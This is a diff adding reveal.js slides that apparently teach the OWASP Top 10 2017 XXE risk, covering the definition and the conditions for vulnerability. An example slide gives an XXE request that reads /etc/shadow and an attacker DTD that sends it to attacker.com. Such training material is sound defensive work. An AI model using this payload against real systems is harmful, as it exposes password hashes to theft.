@@ -1,0 +1,39 @@
+<section data-markdown data-transition="none">
+  <textarea data-template>
+    ### A4:2017 - XML External Entities (XXE)
+    An XML External Entity (XXE) attack abuses a widely available but rarely used feature of XML parsers. Using XXE, an attacker is able to cause Denial of Service (DoS) as well as access local and remote content and services. In some cases, XXE may even enable port scanning and lead to remote code execution.
+  </textarea>
+</section>
+<section data-markdown data-transition="none">
+  <textarea data-template>
+    Applications might be vulnerable if:
+    - The application accepts XML directly or XML uploads, which is then parsed by an XML processor.
+    - Any of the XML processors in the applicaiton or SOAP based web services has DTDs enabled.
+    - If the application uses SOAP prior to version 1.2, it is likely susceptible to XXE attacks if XML entities are being passed to the SOAP framework.
+
+    [More Details](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md)
+  </textarea>
+</section>
+<section data-markdown data-transition="none">
+  <textarea data-template>
+    #### Example Attack
+    Request
+    ```
+    POST http://example.com/xml HTTP/1.1
+    &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;&gt;
+    &lt;!DOCTYPE data \[
+      &lt;!ENTITY % file SYSTEM
+      &quot;file:///etc/shadow&quot;&gt;
+      &lt;!ENTITY % dtd SYSTEM
+      &quot;http://attacker.com/evil.dtd&quot;&gt;
+      %dtd;
+    ]&gt;
+    &lt;data&gt;&amp;send;&lt;/data&gt;
+    ```
+    Attacker DTD
+    ```
+    <!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?collect=%file;'>">
+    %all;
+    ```
+  </textarea>
+</section>
